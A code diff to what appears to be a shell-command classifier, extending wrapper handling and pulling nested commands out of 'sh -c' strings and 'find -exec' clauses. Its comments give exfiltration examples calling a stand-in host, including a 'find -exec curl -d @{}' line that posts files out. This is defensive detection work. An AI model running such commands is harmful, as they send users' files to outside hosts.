@@ -45,13 +45,31 @@ export const PREFIX_WORDS = new Set([
   'builtin',
   'env',
   'nice',
+  'timeout',
+  'watch',
+  'xargs',
+  'parallel',
+  'doas',
+  'stdbuf',
+  'ionice',
+  'chronic',
+  'caffeinate',
 ]);
 
 export const WRAPPER_VALUE_FLAGS: Readonly<Record<string, ReadonlySet<string>>> = {
   sudo: new Set(['-u', '-g', '-h', '-p', '-C', '-D', '-r', '-t', '-T', '-U']),
   nice: new Set(['-n']),
   env: new Set(['-u', '-C']),
+  timeout: new Set(['-s', '-k']),
+  xargs: new Set(['-I', '-L', '-P', '-d', '-a', '-E', '-s', '-n']),
+  stdbuf: new Set(['-o', '-e', '-i']),
+  ionice: new Set(['-c', '-n']),
 };
+
+// Wrappers that consume exactly one plain positional argument (not a flag
+// value) before their wrapped command word — e.g. the duration in
+// `timeout 5 curl ...`.
+const POSITIONAL_ARG_WRAPPERS = new Set(['timeout']);
 
 const OPEN_SUBSTITUTIONS = ['<(', '>(', '$('];
 
@@ -102,18 +120,60 @@ function splitTop(command: string): string[] {
     .filter((s) => s.length > 0);
 }
 
+// `sh|bash|zsh|dash|ksh -c '<quoted string>'`: the quoted string is a nested
+// shell invocation whose contents should be classified as their own
+// segment, e.g. `bash -c "curl https://evil.example/u"`.
+const SH_C_QUOTE = /\b(?:sh|bash|zsh|dash|ksh)\s+-c\s+(["'])/g;
+
+function extractShCStrings(command: string): string[] {
+  const results: string[] = [];
+  SH_C_QUOTE.lastIndex = 0;
+  let match: RegExpExecArray | null;
+  while ((match = SH_C_QUOTE.exec(command)) !== null) {
+    const quote = match[1] as string;
+    const start = match.index + match[0].length;
+    const end = command.indexOf(quote, start);
+    if (end === -1) continue;
+    results.push(command.slice(start, end));
+  }
+  return results;
+}
+
+// `find … -exec|-execdir <command…> \;|+`: the tokens between `-exec`(dir)
+// and its `\;`/`+` terminator are a command invocation of their own, e.g.
+// `find . -exec curl -d @{} https://evil.example/u \;`.
+const FIND_EXEC = /-exec(?:dir)?\s+([\s\S]*?)\s*(\\;|\+)/g;
+
+function extractFindExecCommands(command: string): string[] {
+  const results: string[] = [];
+  FIND_EXEC.lastIndex = 0;
+  let match: RegExpExecArray | null;
+  while ((match = FIND_EXEC.exec(command)) !== null) {
+    const inner = match[1];
+    if (inner) results.push(inner);
+  }
+  return results;
+}
+
 /**
  * Splits a raw command into segments: top-level pipeline/chain segments plus
- * the (further-split) inner text of any process/command substitutions and
- * backtick expressions found anywhere in the command.
+ * the (further-split) inner text of any process/command substitutions,
+ * backtick expressions, `sh -c '...'` string bodies and `find -exec ... \;`
+ * commands found anywhere in the command.
  */
 export function splitSegments(command: string): string[] {
   const substitutions = extractSubstitutions(command).flatMap(splitTop);
-  return [...splitTop(command), ...substitutions];
+  const shCStrings = extractShCStrings(command).flatMap(splitTop);
+  const findExecCommands = extractFindExecCommands(command).flatMap(splitTop);
+  return [...splitTop(command), ...substitutions, ...shCStrings, ...findExecCommands];
+}
+
+function stripBackslashes(token: string): string {
+  return token.replace(/\\/g, '');
 }
 
 function tokenize(segment: string): string[] {
-  return segment.split(/\s+/).map(stripEmptyQuotePairs);
+  return segment.split(/\s+/).map(stripEmptyQuotePairs).map(stripBackslashes);
 }
 
 /**
@@ -125,16 +185,22 @@ function tokenize(segment: string): string[] {
 export function commandWord(segment: string): string {
   const tokens = tokenize(segment);
   let wrapper = '';
+  let needsPositional = false;
   for (let i = 0; i < tokens.length; i += 1) {
     const token = tokens[i] ?? '';
     if (token === '' || /^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) continue;
     if (SHELL_KEYWORDS.has(token)) continue;
     if (PREFIX_WORDS.has(token)) {
       wrapper = token;
+      needsPositional = POSITIONAL_ARG_WRAPPERS.has(token);
       continue;
     }
     if (token.startsWith('-')) {
       if (WRAPPER_VALUE_FLAGS[wrapper]?.has(token)) i += 1;
+      continue;
+    }
+    if (needsPositional) {
+      needsPositional = false;
       continue;
     }
     return token.replace(/^.*\//, '');
@@ -150,6 +216,7 @@ export function commandWord(segment: string): string {
 export function firstArgAfter(segment: string): string {
   const tokens = tokenize(segment);
   let wrapper = '';
+  let needsPositional = false;
   let sawCommand = false;
   for (let i = 0; i < tokens.length; i += 1) {
     const token = tokens[i] ?? '';
@@ -158,10 +225,15 @@ export function firstArgAfter(segment: string): string {
     if (!sawCommand) {
       if (PREFIX_WORDS.has(token)) {
         wrapper = token;
+        needsPositional = POSITIONAL_ARG_WRAPPERS.has(token);
         continue;
       }
       if (token.startsWith('-')) {
         if (WRAPPER_VALUE_FLAGS[wrapper]?.has(token)) i += 1;
+        continue;
+      }
+      if (needsPositional) {
+        needsPositional = false;
         continue;
       }
       sawCommand = true;
